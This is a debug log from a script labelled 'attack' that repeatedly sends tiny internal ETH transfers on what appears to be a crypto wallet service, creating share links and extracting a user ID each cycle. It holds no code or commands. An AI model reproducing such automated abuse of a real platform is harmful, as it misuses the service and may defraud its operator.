2026-02-27 10:27:10,346 | DEBUG | attack | Starting executeFullTransaction
2026-02-27 10:46:03,953 | DEBUG | attack | Step 6: Confirming transaction
2026-02-27 10:46:04,850 | DEBUG | attack | Transaction confirmed successfully
2026-02-27 10:46:04,850 | DEBUG | attack | Step 7: Getting user ID from share link
2026-02-27 10:46:05,773 | DEBUG | attack | Extracted userId: 74499153
2026-02-27 10:46:07,703 | DEBUG | attack | Starting executeFullTransaction
2026-02-27 10:46:07,703 | DEBUG | attack | Target address: 0x9fbb990839A3B775951B76E1B4EBC7E91D470538 | Amount: 0.0000001 | Coin: ETH
2026-02-27 10:46:07,703 | DEBUG | attack | Step 1: Checking internal address
2026-02-27 10:46:08,624 | DEBUG | attack | Address confirmed as internal
2026-02-27 10:46:13,629 | DEBUG | attack | Step 2: Generating new bill ID
2026-02-27 10:46:14,574 | DEBUG | attack | Generated billId: 202602270846142027304254862499840
2026-02-27 10:46:14,574 | DEBUG | attack | Step 3: Making transaction
2026-02-27 10:46:15,875 | DEBUG | attack | Transaction result: {'bill_id': '202602270846142027304254862499840', 'type': 3}
2026-02-27 10:46:15,876 | DEBUG | attack | Step 4: Fetching transaction ID
2026-02-27 10:46:16,785 | DEBUG | attack | Transaction ID: 202602270846152027304260048404480
2026-02-27 10:46:16,786 | DEBUG | attack | Step 5: Creating transaction share link
2026-02-27 10:46:17,778 | DEBUG | attack | Share link created: https://s.cwallet.com/1b3f2uj
2026-02-27 10:46:17,779 | DEBUG | attack | Step 6: Confirming transaction
2026-02-27 10:46:18,666 | DEBUG | attack | Transaction confirmed successfully
2026-02-27 10:46:18,667 | DEBUG | attack | Step 7: Getting user ID from share link
2026-02-27 10:46:19,588 | DEBUG | attack | Extracted userId: 74499153
2026-02-27 10:46:21,521 | DEBUG | attack | Starting executeFullTransaction
2026-02-27 10:46:21,521 | DEBUG | attack | Target address: 0x9fbb990839A3B775951B76E1B4EBC7E91D470538 | Amount: 0.0000001 | Coin: ETH
2026-02-27 10:46:21,521 | DEBUG | attack | Step 1: Checking internal address
2026-02-27 10:46:22,426 | DEBUG | attack | Address confirmed as internal
2026-02-27 10:46:27,432 | DEBUG | attack | Step 2: Generating new bill ID
2026-02-27 10:46:28,607 | DEBUG | attack | Generated billId: 202602270846282027304313704390656
2026-02-27 10:46:28,607 | DEBUG | attack | Step 3: Making transaction
2026-02-27 10:46:29,904 | DEBUG | attack | Transaction result: {'bill_id': '202602270846282027304313704390656', 'type': 3}
2026-02-27 10:46:29,905 | DEBUG | attack | Step 4: Fetching transaction ID
2026-02-27 10:46:30,638 | DEBUG | attack | Transaction ID: 202602270846292027304318911266816
2026-02-27 10:46:30,638 | DEBUG | attack | Step 5: Creating transaction share link
2026-02-27 10:46:31,629 | DEBUG | attack | Share link created: https://s.cwallet.com/102cena
2026-02-27 10:46:31,629 | DEBUG | attack | Step 6: Confirming transaction
2026-02-27 10:46:32,456 | DEBUG | attack | Transaction confirmed successfully
2026-02-27 10:46:32,457 | DEBUG | attack | Step 7: Getting user ID from share link
2026-02-27 10:46:33,380 | DEBUG | attack | Extracted userId: 74499153
2026-02-27 10:46:35,306 | DEBUG | attack | Starting executeFullTransaction
2026-02-27 10:46:35,306 | DEBUG | attack | Target address: 0x9fbb990839A3B775951B76E1B4EBC7E91D470538 | Amount: 0.0000001 | Coin: ETH
2026-02-27 10:46:35,306 | DEBUG | attack | Step 1: Checking internal address
2026-02-27 10:46:36,127 | DEBUG | attack | Address confirmed as internal
2026-02-27 10:46:41,132 | DEBUG | attack | Step 2: Generating new bill ID
2026-02-27 10:46:42,290 | DEBUG | attack | Generated billId: 202602270846422027304371116023808
2026-02-27 10:46:42,290 | DEBUG | attack | Step 3: Making transaction
2026-02-27 10:46:43,463 | DEBUG | attack | Transaction result: {'bill_id': '202602270846422027304371116023808', 'type': 3}
2026-02-27 10:46:43,464 | DEBUG | attack | Step 4: Fetching transaction ID
2026-02-27 10:46:44,392 | DEBUG | attack | Transaction ID: 202602270846432027304375345627136
2026-02-27 10:46:44,393 | DEBUG | attack | Step 5: Creating transaction share link
2026-02-27 10:46:45,384 | DEBUG | attack | Share link created: https://s.cwallet.com/12mdb4j
2026-02-27 10:46:45,384 | DEBUG | attack | Step 6: Confirming transaction
2026-02-27 10:46:46,298 | DEBUG | attack | Transaction confirmed successfully
2026-02-27 10:46:46,298 | DEBUG | attack | Step 7: Getting user ID from share link
2026-02-27 10:46:47,195 | DEBUG | attack | Extracted userId: 74499153
2026-02-27 10:46:49,121 | DEBUG | attack | Starting executeFullTransaction
2026-02-27 10:46:49,121 | DEBUG | attack | Target address: 0x9fbb990839A3B775951B76E1B4EBC7E91D470538 | Amount: 0.0000001 | Coin: ETH
2026-02-27 10:46:49,121 | DEBUG | attack | Step 1: Checking internal address
2026-02-27 10:46:49,939 | DEBUG | attack | Address confirmed as internal
2026-02-27 10:46:54,945 | DEBUG | attack | Step 2: Generating new bill ID
2026-02-27 10:46:55,898 | DEBUG | attack | Generated billId: 202602270846552027304428171137024
2026-02-27 10:46:55,899 | DEBUG | attack | Step 3: Making transaction
2026-02-27 10:46:57,087 | DEBUG | attack | Transaction result: {'bill_id': '202602270846552027304428171137024', 'type': 3}
2026-02-27 10:46:57,088 | DEBUG | attack | Step 4: Fetching transaction ID
2026-02-27 10:46:58,012 | DEBUG | attack | Transaction ID: 202602270846562027304432484634624
2026-02-27 10:46:58,012 | DEBUG | attack | Step 5: Creating transaction share link
2026-02-27 10:46:59,021 | DEBUG | attack | Share link created: https://s.cwallet.com/1bzmv8h
2026-02-27 10:46:59,021 | DEBUG | attack | Step 6: Confirming transaction
2026-02-27 10:46:59,930 | DEBUG | attack | Transaction confirmed successfully
2026-02-27 10:46:59,930 | DEBUG | attack | Step 7: Getting user ID from share link
2026-02-27 10:47:00,974 | DEBUG | attack | Extracted userId: 74499153
2026-02-27 10:47:02,905 | DEBUG | attack | Starting executeFullTransaction
2026-02-27 10:47:02,905 | DEBUG | attack | Target address: 0x9fbb990839A3B775951B76E1B4EBC7E91D470538 | Amount: 0.0000001 | Coin: ETH
2026-02-27 10:47:02,905 | DEBUG | attack | Step 1: Checking internal address
2026-02-27 10:47:03,727 | DEBUG | attack | Address confirmed as internal
2026-02-27 10:47:08,732 | DEBUG | attack | Step 2: Generating new bill ID
2026-02-27 10:47:09,678 | DEBUG | attack | Generated billId: 202602270847092027304485964455936
2026-02-27 10:47:09,678 | DEBUG | attack | Step 3: Making transaction
2026-02-27 10:47:11,082 | DEBUG | attack | Transaction result: {'bill_id': '202602270847092027304485964455936', 'type': 3}
2026-02-27 10:47:11,082 | DEBUG | attack | Step 4: Fetching transaction ID
2026-02-27 10:47:11,972 | DEBUG | attack | Transaction ID: 202602270847102027304491200696320
2026-02-27 10:47:11,972 | DEBUG | attack | Step 5: Creating transaction share link
2026-02-27 10:47:12,976 | DEBUG | attack | Share link created: https://s.cwallet.com/18hhz2n
2026-02-27 10:47:12,976 | DEBUG | attack | Step 6: Confirming transaction
2026-02-27 10:47:13,772 | DEBUG | attack | Transaction confirmed successfully
2026-02-27 10:47:13,772 | DEBUG | attack | Step 7: Getting user ID from share link
2026-02-27 10:47:14,682 | DEBUG | attack | Extracted userId: 74499153
2026-02-27 10:47:16,607 | DEBUG | attack | Starting executeFullTransaction
2026-02-27 10:47:16,608 | DEBUG | attack | Target address: 0x9fbb990839A3B775951B76E1B4EBC7E91D470538 | Amount: 0.0000001 | Coin: ETH
2026-02-27 10:47:16,608 | DEBUG | attack | Step 1: Checking internal address
2026-02-27 10:47:17,521 | DEBUG | attack | Address confirmed as internal
2026-02-27 10:47:22,527 | DEBUG | attack | Step 2: Generating new bill ID
2026-02-27 10:47:23,466 | DEBUG | attack | Generated billId: 202602270847232027304543803904000
2026-02-27 10:47:23,466 | DEBUG | attack | Step 3: Making transaction
2026-02-27 10:47:24,591 | DEBUG | attack | Transaction result: {'bill_id': '202602270847232027304543803904000', 'type': 3}
2026-02-27 10:47:24,592 | DEBUG | attack | Step 4: Fetching transaction ID
2026-02-27 10:47:25,665 | DEBUG | attack | Transaction ID: 202602270847242027304548012544000
2026-02-27 10:47:25,665 | DEBUG | attack | Step 5: Creating transaction share link
2026-02-27 10:47:26,642 | DEBUG | attack | Share link created: https://s.cwallet.com/1c8qpt9
2026-02-27 10:47:26,643 | DEBUG | attack | Step 6: Confirming transaction
2026-02-27 10:47:27,560 | DEBUG | attack | Transaction confirmed successfully
2026-02-27 10:47:27,560 | DEBUG | attack | Step 7: Getting user ID from share link
2026-02-27 10:47:28,471 | DEBUG | attack | Extracted userId: 74499153
2026-02-27 10:47:30,378 | DEBUG | attack | Starting executeFullTransaction
2026-02-27 10:47:30,378 | DEBUG | attack | Target address: 0x9fbb990839A3B775951B76E1B4EBC7E91D470538 | Amount: 0.0000001 | Coin: ETH
2026-02-27 10:47:30,378 | DEBUG | attack | Step 1: Checking internal address
2026-02-27 10:47:31,293 | DEBUG | attack | Address confirmed as internal
2026-02-27 10:47:36,299 | DEBUG | attack | Step 2: Generating new bill ID
2026-02-27 10:47:37,445 | DEBUG | attack | Generated billId: 202602270847372027304602423500800
2026-02-27 10:47:37,446 | DEBUG | attack | Step 3: Making transaction
2026-02-27 10:47:38,994 | DEBUG | attack | Transaction result: {'bill_id': '202602270847372027304602423500800', 'type': 3}
2026-02-27 10:47:38,994 | DEBUG | attack | Step 4: Fetching transaction ID
2026-02-27 10:47:39,890 | DEBUG | attack | Transaction ID: 202602270847382027304607882039296
2026-02-27 10:47:39,890 | DEBUG | attack | Step 5: Creating transaction share link
2026-02-27 10:47:40,895 | DEBUG | attack | Share link created: https://s.cwallet.com/12vos08
2026-02-27 10:47:40,895 | DEBUG | attack | Step 6: Confirming transaction
2026-02-27 10:47:41,796 | DEBUG | attack | Transaction confirmed successfully
2026-02-27 10:47:41,796 | DEBUG | attack | Step 7: Getting user ID from share link
2026-02-27 10:47:42,704 | DEBUG | attack | Extracted userId: 74499153
2026-02-27 10:47:44,627 | DEBUG | attack | Starting executeFullTransaction
2026-02-27 10:47:44,627 | DEBUG | attack | Target address: 0x9fbb990839A3B775951B76E1B4EBC7E91D470538 | Amount: 0.0000001 | Coin: ETH
2026-02-27 10:47:44,627 | DEBUG | attack | Step 1: Checking internal address
2026-02-27 10:47:45,431 | DEBUG | attack | Address confirmed as internal
2026-02-27 10:47:50,438 | DEBUG | attack | Step 2: Generating new bill ID
2026-02-27 10:47:51,370 | DEBUG | attack | Generated billId: 202602270847512027304660858544128
2026-02-27 10:47:51,371 | DEBUG | attack | Step 3: Making transaction
2026-02-27 10:47:52,693 | DEBUG | attack | Transaction result: {'bill_id': '202602270847512027304660858544128', 'type': 3}
2026-02-27 10:47:52,693 | DEBUG | attack | Step 4: Fetching transaction ID
2026-02-27 10:47:53,604 | DEBUG | attack | Transaction ID: 202602270847522027304665239142400
2026-02-27 10:47:53,604 | DEBUG | attack | Step 5: Creating transaction share link
2026-02-27 10:47:54,606 | DEBUG | attack | Share link created: https://s.cwallet.com/17oqgh3
2026-02-27 10:47:54,606 | DEBUG | attack | Step 6: Confirming transaction
2026-02-27 10:47:55,426 | DEBUG | attack | Transaction confirmed successfully
2026-02-27 10:47:55,427 | DEBUG | attack | Step 7: Getting user ID from share link
2026-02-27 10:47:56,328 | DEBUG | attack | Extracted userId: 74499153
2026-02-27 10:47:58,155 | DEBUG | attack | Starting executeFullTransaction
2026-02-27 10:47:58,155 | DEBUG | attack | Target address: 0x9fbb990839A3B775951B76E1B4EBC7E91D470538 | Amount: 0.0000001 | Coin: ETH
2026-02-27 10:47:58,155 | DEBUG | attack | Step 1: Checking internal address
2026-02-27 10:47:58,991 | DEBUG | attack | Address confirmed as internal
2026-02-27 10:48:03,997 | DEBUG | attack | Step 2: Generating new bill ID
2026-02-27 10:48:05,076 | DEBUG | attack | Generated billId: 202602270848052027304718354063360
2026-02-27 10:48:05,077 | DEBUG | attack | Step 3: Making transaction
2026-02-27 10:48:06,248 | DEBUG | attack | Transaction result: {'bill_id': '202602270848052027304718354063360', 'type': 3}
2026-02-27 10:48:06,249 | DEBUG | attack | Step 4: Fetching transaction ID
2026-02-27 10:48:07,166 | DEBUG | attack | Transaction ID: 202602270848062027304722592055296
2026-02-27 10:48:07,166 | DEBUG | attack | Step 5: Creating transaction share link
2026-02-27 10:48:08,424 | DEBUG | attack | Share link created: https://s.cwallet.com/1030res
2026-02-27 10:48:08,425 | DEBUG | attack | Step 6: Confirming transaction
2026-02-27 10:48:09,323 | DEBUG | attack | Transaction confirmed successfully
2026-02-27 10:48:09,324 | DEBUG | attack | Step 7: Getting user ID from share link
2026-02-27 10:48:10,243 | DEBUG | attack | Extracted userId: 74499153
2026-02-27 10:48:12,069 | DEBUG | attack | Starting executeFullTransaction
2026-02-27 10:48:12,069 | DEBUG | attack | Target address: 0x9fbb990839A3B775951B76E1B4EBC7E91D470538 | Amount: 0.0000001 | Coin: ETH
2026-02-27 10:48:12,069 | DEBUG | attack | Step 1: Checking internal address
2026-02-27 10:48:12,881 | DEBUG | attack | Address confirmed as internal
2026-02-27 10:48:17,886 | DEBUG | attack | Step 2: Generating new bill ID
2026-02-27 10:48:19,060 | DEBUG | attack | Generated billId: 202602270848182027304776998817792
2026-02-27 10:48:19,066 | DEBUG | attack | Step 3: Making transaction
2026-02-27 10:48:20,162 | DEBUG | attack | Transaction result: {'bill_id': '202602270848182027304776998817792', 'type': 3}
2026-02-27 10:48:20,162 | DEBUG | attack | Step 4: Fetching transaction ID
2026-02-27 10:48:21,069 | DEBUG | attack | Transaction ID: 202602270848202027304781354254336
2026-02-27 10:48:21,069 | DEBUG | attack | Step 5: Creating transaction share link
2026-02-27 10:48:22,065 | DEBUG | attack | Share link created: https://s.cwallet.com/10u9tls
2026-02-27 10:48:22,065 | DEBUG | attack | Step 6: Confirming transaction
2026-02-27 10:48:22,891 | DEBUG | attack | Transaction confirmed successfully
2026-02-27 10:48:22,891 | DEBUG | attack | Step 7: Getting user ID from share link
2026-02-27 10:48:23,803 | DEBUG | attack | Extracted userId: 74499153
2026-02-27 10:48:25,651 | DEBUG | attack | Starting executeFullTransaction
2026-02-27 10:48:25,652 | DEBUG | attack | Target address: 0x9fbb990839A3B775951B76E1B4EBC7E91D470538 | Amount: 0.0000001 | Coin: ETH
2026-02-27 10:48:25,652 | DEBUG | attack | Step 1: Checking internal address
2026-02-27 10:48:26,572 | DEBUG | attack | Address confirmed as internal
2026-02-27 10:48:31,578 | DEBUG | attack | Step 2: Generating new bill ID
2026-02-27 10:48:32,525 | DEBUG | attack | Generated billId: 202602270848322027304833475125248
2026-02-27 10:48:32,526 | DEBUG | attack | Step 3: Making transaction
2026-02-27 10:48:33,912 | DEBUG | attack | Transaction result: {'bill_id': '202602270848322027304833475125248', 'type': 3}
2026-02-27 10:48:33,913 | DEBUG | attack | Step 4: Fetching transaction ID
2026-02-27 10:48:34,775 | DEBUG | attack | Transaction ID: 202602270848332027304838761697280
2026-02-27 10:48:34,775 | DEBUG | attack | Step 5: Creating transaction share link
2026-02-27 10:48:35,774 | DEBUG | attack | Share link created: https://s.cwallet.com/17z7wcv
2026-02-27 10:48:35,774 | DEBUG | attack | Step 6: Confirming transaction
2026-02-27 10:48:36,696 | DEBUG | attack | Transaction confirmed successfully
2026-02-27 10:48:36,697 | DEBUG | attack | Step 7: Getting user ID from share link
2026-02-27 10:48:37,873 | DEBUG | attack | Extracted userId: 74499153
2026-02-27 10:48:39,811 | DEBUG | attack | Starting executeFullTransaction
2026-02-27 10:48:39,812 | DEBUG | attack | Target address: 0x9fbb990839A3B775951B76E1B4EBC7E91D470538 | Amount: 0.0000001 | Coin: ETH
2026-02-27 10:48:39,812 | DEBUG | attack | Step 1: Checking internal address
2026-02-27 10:48:40,939 | DEBUG | attack | Address confirmed as internal
2026-02-27 10:48:45,945 | DEBUG | attack | Step 2: Generating new bill ID
2026-02-27 10:48:46,941 | DEBUG | attack | Generated billId: 202602270848462027304893952794624
2026-02-27 10:48:46,941 | DEBUG | attack | Step 3: Making transaction
2026-02-27 10:48:48,075 | DEBUG | attack | Transaction result: {'bill_id': '202602270848462027304893952794624', 'type': 3}
2026-02-27 10:48:48,076 | DEBUG | attack | Step 4: Fetching transaction ID
2026-02-27 10:48:48,992 | DEBUG | attack | Transaction ID: 202602270848472027304898081738752
2026-02-27 10:48:48,993 | DEBUG | attack | Step 5: Creating transaction share link
2026-02-27 10:48:49,891 | DEBUG | attack | Share link created: https://s.cwallet.com/1bdhv06
2026-02-27 10:48:49,891 | DEBUG | attack | Step 6: Confirming transaction
2026-02-27 10:48:50,815 | DEBUG | attack | Transaction confirmed successfully
2026-02-27 10:48:50,816 | DEBUG | attack | Step 7: Getting user ID from share link
2026-02-27 10:48:51,728 | DEBUG | attack | Extracted userId: 74499153
2026-02-27 10:48:53,747 | DEBUG | attack | Starting executeFullTransaction
2026-02-27 10:48:53,747 | DEBUG | attack | Target address: 0x9fbb990839A3B775951B76E1B4EBC7E91D470538 | Amount: 0.0000001 | Coin: ETH
2026-02-27 10:48:53,748 | DEBUG | attack | Step 1: Checking internal address
2026-02-27 10:48:54,662 | DEBUG | attack | Address confirmed as internal
2026-02-27 10:48:59,668 | DEBUG | attack | Step 2: Generating new bill ID
2026-02-27 10:49:00,844 | DEBUG | attack | Generated billId: 202602270849002027304952266203136
2026-02-27 10:49:00,844 | DEBUG | attack | Step 3: Making transaction
2026-02-27 10:49:02,195 | DEBUG | attack | Transaction result: {'bill_id': '202602270849002027304952266203136', 'type': 3}
2026-02-27 10:49:02,195 | DEBUG | attack | Step 4: Fetching transaction ID
2026-02-27 10:49:03,021 | DEBUG | attack | Transaction ID: 202602270849022027304957401776128
2026-02-27 10:49:03,021 | DEBUG | attack | Step 5: Creating transaction share link
2026-02-27 10:49:04,012 | DEBUG | attack | Share link created: https://s.cwallet.com/18w4ie4
2026-02-27 10:49:04,012 | DEBUG | attack | Step 6: Confirming transaction
2026-02-27 10:49:04,920 | DEBUG | attack | Transaction confirmed successfully
2026-02-27 10:49:04,921 | DEBUG | attack | Step 7: Getting user ID from share link
2026-02-27 10:49:05,945 | DEBUG | attack | Extracted userId: 74499153
2026-02-27 10:49:08,003 | DEBUG | attack | Starting executeFullTransaction
2026-02-27 10:49:08,003 | DEBUG | attack | Target address: 0x9fbb990839A3B775951B76E1B4EBC7E91D470538 | Amount: 0.0000001 | Coin: ETH
2026-02-27 10:49:08,004 | DEBUG | attack | Step 1: Checking internal address
2026-02-27 10:49:08,908 | DEBUG | attack | Address confirmed as internal
2026-02-27 10:49:13,913 | DEBUG | attack | Step 2: Generating new bill ID
2026-02-27 10:49:14,848 | DEBUG | attack | Generated billId: 202602270849142027305010990653440
2026-02-27 10:49:14,848 | DEBUG | attack | Step 3: Making transaction
2026-02-27 10:49:15,978 | DEBUG | attack | Transaction result: {'bill_id': '202602270849142027305010990653440', 'type': 3}
2026-02-27 10:49:15,978 | DEBUG | attack | Step 4: Fetching transaction ID
2026-02-27 10:49:16,891 | DEBUG | attack | Transaction ID: 202602270849152027305015157346304
2026-02-27 10:49:16,892 | DEBUG | attack | Step 5: Creating transaction share link
2026-02-27 10:49:17,889 | DEBUG | attack | Share link created: https://s.cwallet.com/1atz48w
2026-02-27 10:49:17,889 | DEBUG | attack | Step 6: Confirming transaction
2026-02-27 10:49:18,709 | DEBUG | attack | Transaction confirmed successfully
2026-02-27 10:49:18,709 | DEBUG | attack | Step 7: Getting user ID from share link
2026-02-27 10:49:19,621 | DEBUG | attack | Extracted userId: 74499153
2026-02-27 10:49:21,545 | DEBUG | attack | Starting executeFullTransaction
2026-02-27 10:49:21,545 | DEBUG | attack | Target address: 0x9fbb990839A3B775951B76E1B4EBC7E91D470538 | Amount: 0.0000001 | Coin: ETH
2026-02-27 10:49:21,545 | DEBUG | attack | Step 1: Checking internal address
2026-02-27 10:49:22,445 | DEBUG | attack | Address confirmed as internal
2026-02-27 10:49:27,451 | DEBUG | attack | Step 2: Generating new bill ID
2026-02-27 10:49:28,523 | DEBUG | attack | Generated billId: 202602270849282027305068750409728
2026-02-27 10:49:28,523 | DEBUG | attack | Step 3: Making transaction
2026-02-27 10:49:29,720 | DEBUG | attack | Transaction result: {'bill_id': '202602270849282027305068750409728', 'type': 3}
2026-02-27 10:49:29,721 | DEBUG | attack | Step 4: Fetching transaction ID
2026-02-27 10:49:30,625 | DEBUG | attack | Transaction ID: 202602270849292027305072661254144
2026-02-27 10:49:30,626 | DEBUG | attack | Step 5: Creating transaction share link
2026-02-27 10:49:31,629 | DEBUG | attack | Share link created: https://s.cwallet.com/17o4kpv
2026-02-27 10:49:31,629 | DEBUG | attack | Step 6: Confirming transaction
2026-02-27 10:49:32,531 | DEBUG | attack | Transaction confirmed successfully
2026-02-27 10:49:32,531 | DEBUG | attack | Step 7: Getting user ID from share link
2026-02-27 10:49:33,449 | DEBUG | attack | Extracted userId: 74499153
2026-02-27 10:49:35,382 | DEBUG | attack | Starting executeFullTransaction
2026-02-27 10:49:35,383 | DEBUG | attack | Target address: 0x9fbb990839A3B775951B76E1B4EBC7E91D470538 | Amount: 0.0000001 | Coin: ETH
2026-02-27 10:49:35,383 | DEBUG | attack | Step 1: Checking internal address
2026-02-27 10:49:36,294 | DEBUG | attack | Address confirmed as internal
2026-02-27 10:49:41,299 | DEBUG | attack | Step 2: Generating new bill ID
2026-02-27 10:49:42,451 | DEBUG | attack | Generated billId: 202602270849422027305126791192576
2026-02-27 10:49:42,451 | DEBUG | attack | Step 3: Making transaction
2026-02-27 10:49:43,567 | DEBUG | attack | Transaction result: {'bill_id': '202602270849422027305126791192576', 'type': 3}
2026-02-27 10:49:43,568 | DEBUG | attack | Step 4: Fetching transaction ID
2026-02-27 10:49:44,720 | DEBUG | attack | Transaction ID: 202602270849432027305130920136704
2026-02-27 10:49:44,721 | DEBUG | attack | Step 5: Creating transaction share link
2026-02-27 10:49:45,700 | DEBUG | attack | Share link created: https://s.cwallet.com/1340ocn
2026-02-27 10:49:45,701 | DEBUG | attack | Step 6: Confirming transaction
2026-02-27 10:49:46,612 | DEBUG | attack | Transaction confirmed successfully
2026-02-27 10:49:46,613 | DEBUG | attack | Step 7: Getting user ID from share link
2026-02-27 10:49:47,522 | DEBUG | attack | Extracted userId: 74499153
2026-02-27 10:49:49,351 | DEBUG | attack | Starting executeFullTransaction
2026-02-27 10:49:49,351 | DEBUG | attack | Target address: 0x9fbb990839A3B775951B76E1B4EBC7E91D470538 | Amount: 0.0000001 | Coin: ETH
2026-02-27 10:49:49,351 | DEBUG | attack | Step 1: Checking internal address
2026-02-27 10:49:50,262 | DEBUG | attack | Address confirmed as internal
2026-02-27 10:49:55,267 | DEBUG | attack | Step 2: Generating new bill ID
2026-02-27 10:49:56,210 | DEBUG | attack | Generated billId: 202602270849562027305184475455488
2026-02-27 10:49:56,211 | DEBUG | attack | Step 3: Making transaction
2026-02-27 10:49:57,347 | DEBUG | attack | Transaction result: {'bill_id': '202602270849562027305184475455488', 'type': 3}
2026-02-27 10:49:57,347 | DEBUG | attack | Step 4: Fetching transaction ID
2026-02-27 10:49:58,499 | DEBUG | attack | Transaction ID: 202602270849572027305188684091392
2026-02-27 10:49:58,499 | DEBUG | attack | Step 5: Creating transaction share link
2026-02-27 10:49:59,473 | DEBUG | attack | Share link created: https://s.cwallet.com/10kz11y
2026-02-27 10:49:59,474 | DEBUG | attack | Step 6: Confirming transaction
2026-02-27 10:50:00,294 | DEBUG | attack | Transaction confirmed successfully
2026-02-27 10:50:00,294 | DEBUG | attack | Step 7: Getting user ID from share link
2026-02-27 10:50:01,199 | DEBUG | attack | Extracted userId: 74499153
2026-02-27 10:50:03,113 | DEBUG | attack | Starting executeFullTransaction
2026-02-27 10:50:03,113 | DEBUG | attack | Target address: 0x9fbb990839A3B775951B76E1B4EBC7E91D470538 | Amount: 0.0000001 | Coin: ETH
2026-02-27 10:50:03,114 | DEBUG | attack | Step 1: Checking internal address
2026-02-27 10:50:04,024 | DEBUG | attack | Address confirmed as internal
2026-02-27 10:50:09,030 | DEBUG | attack | Step 2: Generating new bill ID
2026-02-27 10:50:10,336 | DEBUG | attack | Generated billId: 202602270850102027305243732578304
2026-02-27 10:50:10,336 | DEBUG | attack | Step 3: Making transaction
2026-02-27 10:50:11,901 | DEBUG | attack | Transaction result: {'bill_id': '202602270850102027305243732578304', 'type': 3}
2026-02-27 10:50:11,902 | DEBUG | attack | Step 4: Fetching transaction ID
2026-02-27 10:50:12,835 | DEBUG | attack | Transaction ID: 202602270850112027305249119813632
2026-02-27 10:50:12,835 | DEBUG | attack | Step 5: Creating transaction share link
2026-02-27 10:50:13,824 | DEBUG | attack | Share link created: https://s.cwallet.com/12mne5h
2026-02-27 10:50:13,825 | DEBUG | attack | Step 6: Confirming transaction
2026-02-27 10:50:14,643 | DEBUG | attack | Transaction confirmed successfully
2026-02-27 10:50:14,644 | DEBUG | attack | Step 7: Getting user ID from share link
2026-02-27 10:50:15,463 | DEBUG | attack | Extracted userId: 74499153
2026-02-27 10:50:18,393 | DEBUG | attack | Starting executeFullTransaction
2026-02-27 10:50:18,393 | DEBUG | attack | Target address: 0x9fbb990839A3B775951B76E1B4EBC7E91D470538 | Amount: 0.0000001 | Coin: ETH
2026-02-27 10:50:18,393 | DEBUG | attack | Step 1: Checking internal address
2026-02-27 10:50:19,309 | DEBUG | attack | Address confirmed as internal
2026-02-27 10:50:24,314 | DEBUG | attack | Step 2: Generating new bill ID
2026-02-27 10:50:25,251 | DEBUG | attack | Generated billId: 202602270850252027305306311598080
2026-02-27 10:50:25,251 | DEBUG | attack | Step 3: Making transaction
2026-02-27 10:50:26,401 | DEBUG | attack | Transaction result: {'bill_id': '202602270850252027305306311598080', 'type': 3}
2026-02-27 10:50:26,401 | DEBUG | attack | Step 4: Fetching transaction ID
2026-02-27 10:50:27,319 | DEBUG | attack | Transaction ID: 202602270850262027305310465708032
2026-02-27 10:50:27,319 | DEBUG | attack | Step 5: Creating transaction share link
2026-02-27 10:50:28,323 | DEBUG | attack | Share link created: https://s.cwallet.com/y0q0q5
2026-02-27 10:50:28,323 | DEBUG | attack | Step 6: Confirming transaction
2026-02-27 10:50:29,435 | DEBUG | attack | Transaction confirmed successfully
2026-02-27 10:50:29,436 | DEBUG | attack | Step 7: Getting user ID from share link
2026-02-27 10:50:30,353 | DEBUG | attack | Extracted userId: 74499153
